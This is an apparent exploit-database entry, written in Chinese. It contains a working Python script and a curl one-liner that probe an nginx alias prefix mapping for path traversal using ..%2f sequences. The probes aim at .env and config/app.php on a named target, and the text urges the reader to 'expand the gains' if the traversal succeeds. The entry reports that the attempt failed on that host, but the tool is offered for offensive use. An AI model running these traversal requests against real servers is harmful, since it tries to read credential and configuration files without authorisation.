# 路径穿越有效性判定：归一化等价对照法（nginx alias 前缀映射场景）

- **code**: 路径穿越有效性判定-归一化等价对照法-nginx-alias-前缀映射场景
- **kind**: script
- **category**: path-traversal
- **component**: nginx-alias / %2f 编码穿越
- **versions**: nginx 1.18.0 (Ubuntu)
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.95 / example.com 实测：4 组对照全部 SAME —— /app/config/app.php 与 /app/admin/..%2fconfig/app.php 同为 404/378B；/config/app.php 与 /app/admin/..%2f..%2fconfig/app.php 同为 200/763B(SPA index)；/app/component/pear/css/pear.css 与 /app/admin/../component/pear/css/pear.css 同为 404/564B。深度边界：/app/admin/ 下 1-2 层 → 404/564，≥3 层 → 400/166(nginx Bad Request)，根层 /..%2f.env 亦 400。共 110+93 请求无一读到文件，结论「该目标路径穿越不成立」由此法证伪。
- **path**: pocs/路径穿越有效性判定-归一化等价对照法-nginx-alias-前缀映射场景/traversal_equiv_test.py
- **tags**: nginx,alias,路径穿越,%2f,归一化,判定方法
- **created_at**: 2026-10-12T14:25:20.413Z
- **found_by**: exploit

## 描述

用「归一化等价直连路径」做对照，判定 alias 前缀映射的路径穿越是否真实生效（避免在失效编码上白费功夫），并给出 nginx 逃逸出根的 400 深度边界。

## 用法

```
python3 traversal_equiv_test.py 203.0.113.95 example.com
输出 SAME 即穿越无效（nginx 已解码 %2f 并消解 .. 段），DIFF 即穿越真实生效、立刻用该编码扩大战果。
配合 curl 复现：curl -sS -k --path-as-is --connect-to example.com:443:203.0.113.95:443 'https://example.com/app/admin/..%2f..%2f..%2f.env' -w '%{http_code} %{size_download}'（必须带 --path-as-is）
```

## 正文

```
#!/usr/bin/env python3
# 归一化等价对照法：判定「前缀映射(alias)路径穿越」是真实生效还是被 nginx 归一化吃掉。
# 核心思路：穿越路径 R = P(../)^n + T 必然等价于某个「普通直连路径」Q。
#   若 resp(R) == resp(Q) 字节级一致 ⇒ 归一化已发生（或 alias 未拼接），穿越是 no-op，别再瞎试编码；
#   若 resp(R) != resp(Q)     ⇒ alias 把 .. 直接丢给文件系统，穿越真实生效，立即沿该编码扩大战果。
import socket, ssl, sys, time

IP, HOST = sys.argv[1], sys.argv[2]

def req(path, timeout=12):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((IP, 443), timeout=timeout), server_hostname=HOST)
    # 关键：raw socket 直发请求行，避免 curl/浏览器自身把 ../ 归一化掉
    s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n" % (path, HOST)).encode("latin-1"))
    d = b""
    while True:
        try:
            c = s.recv(65535)
        except Exception:
            break
        if not c:
            break
        d += c
    s.close()
    hdr, _, body = d.partition(b"\r\n\r\n")
    code = hdr.split(b"\r\n")[0].split(b" ")[1]
    return code.decode(), len(body), body

PAIRS = [
    # (穿越路径, 其归一化等价直连路径)
    ("/app/admin/..%2fconfig/app.php",                    "/app/config/app.php"),
    ("/app/admin/..%2f..%2fconfig/app.php",               "/config/app.php"),
    ("/app/admin/../component/pear/css/pear.css",         "/app/component/pear/css/pear.css"),
    ("/static/..%2f..%2f.env",                            "/.env"),
]
for trav, plain in PAIRS:
    a, b = req(trav), (time.sleep(2), req(plain))[1]
    same = (a[0], a[1], a[2]) == (b[0], b[1], b[2])
    print("[%s] %-52s vs [%s] %-32s => %s" % (a[0], trav, b[0], plain,
          "SAME(被归一化, 穿越无效)" if same else "DIFF(穿越可能真实生效!)"))
    time.sleep(2)

# 深度边界：归一化后逃出站点根的一律 400 (nginx Bad Request)
for d in (1, 2, 3, 4, 5):
    p = "/app/admin/" + "..%2f" * d + ".env"
    c, bl, _ = req(p)
    print("[%s] %-6d %s" % (c, bl, p))
    time.sleep(2)

```
